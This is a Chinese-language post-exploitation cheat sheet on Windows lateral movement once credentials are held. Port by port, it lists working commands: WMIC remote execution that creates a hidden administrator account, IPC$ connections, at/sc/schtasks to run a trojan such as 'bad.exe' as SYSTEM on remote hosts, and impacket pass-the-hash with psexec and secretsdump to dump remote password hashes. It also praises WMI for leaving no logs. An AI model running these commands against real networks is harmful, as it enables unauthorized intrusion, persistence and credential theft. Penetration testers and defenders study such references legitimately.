# windows 拥有凭证之后能做的哪些事
# 利用端口扫描发现能做的姿势
## 135 端口
### 服务
Remote Procedure Call (RPC) Locator 管理 RPC 名称服务数据库。

Server 支持此计算机通过网络的文件、打印、和命名管道共享。如果服务停止，这些功能不可用。

NTLM Security Support Provider 为使用传输协议而不是命名管道的远程过程调用(RPC)程序提供安全机制。

TCP/IP NetBIOS Helper 允许对“TCP/IP 上 NetBIOS (NetBT)”服务以及 NetBIOS 名称解析的支持
### WMI
Windows Management Instrumentation，它出现在所有的 Windows操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的Windows系统，攻击者使用wmi来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。
### wmic 远程命令执行
```
1.列出远程主机进程
wmic /node:192.168.1.1 /user:192.168.1.1\administrator /password:!@#123QWE process list brief
2.在远程系统上执行bat脚本
wmic /node:192.168.1.1 /user:192.168.1.1\administrator /password:!@#123QWE process call create c:\programdata\test.bat
3.在远程系统上执行单条命令
wmic /node:192.168.1.1 /user:192.168.1.1\administrator /password:!@#123QWE process call create "cmd.exe /c net user test1 !@#123QWE /add && net localgroup administrators test1 /add
```

## 139端口,445 端口
## 服务
SMB，全称是Server Message Block（服务器消息快协议），用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居
### ipc
IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。当然，还是在同一个时间，还是同样的两个IP，他们之间只能建立一个IPC$连接，脚踏多条船无论什么时候都是不可取的。通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行……
```
建立ipc连接
net use \\target_ip passowrd /user:admin\username

查看连接
net use 

删除连接
net use \\target_ip /del

利用(可以对目标文件像本地文件一样操作):

dir \\target\c$\ (远程遍历目标文件)
tasklist /s target_ip (远程查看目标进程)
copy local\path\file \\target_IP\path (文件传输)
```
### at
at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。
```
条件:
建立了ipc 连接
net use \\target_ip passowrd /user:admin\username

执行命令
at \\target_ip 16:40:00 cmd.exe /c "命令"         到时执行命令
```
### sc 
是用于与服务控制管理器和服务进行通信的命令行程序。
```
条件:
建立了ipc 连接
net use \\target_ip passowrd /user:admin\username
1.创建服务
sc \\target_ip create [servername] binpath= "path/bad.exe"
2.查询服务
sc \\target_ip query servername
3.运行服务
sc \\target_ip run [servername]
4.删除服务
sc \\target_ip run delete [servername]
```
### schtasks
计划要定期运行或特定时间运行的命令和程序，在计划中添加和删除任务，按需启动和停止任务，并显示和更改计划的任务。

```
1.创建计划任务(用户登录执行)
schtasks /CREATE /TN [taskname] /TR [program绝对路径] /SC ONLOGON /RU "SYSTEM" /S [host] /U [user] /P [pass]  /F
定时执行一次
schtasks /CREATE /TN [taskname] /TR [program绝对路径] /SC ONCE /RU "SYSTEM" /ST [time] /S [host] /U [user] /P [pass]  /F	
#每天定时执行
schtasks /CREATE /TN [taskname] /TR [program绝对路径] /SC DAILY /RU "SYSTEM" /ST [time] /S [host] /U [user] /P [pass]  /F	
2.立即执行计划任务
schtasks /RUN /TN [taskname] /S [host] /U [user] /P [pass] /I		
3.删除计划任务
schtasks /DELETE /TN [taskname] /S [host] /U [user] /P [pass] 			
schtasks /DELETE /TN [taskname] /S [host] /U [user] /P [pass] /F	#强制删除
```

### PTH(hash传递)
#### impacket(kali)
```
1.远程执行命令
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
2.建立ipc连接
impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2
3.远程导hash
impacket-secretsdump WORKGROUP/Administrator@10.1.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
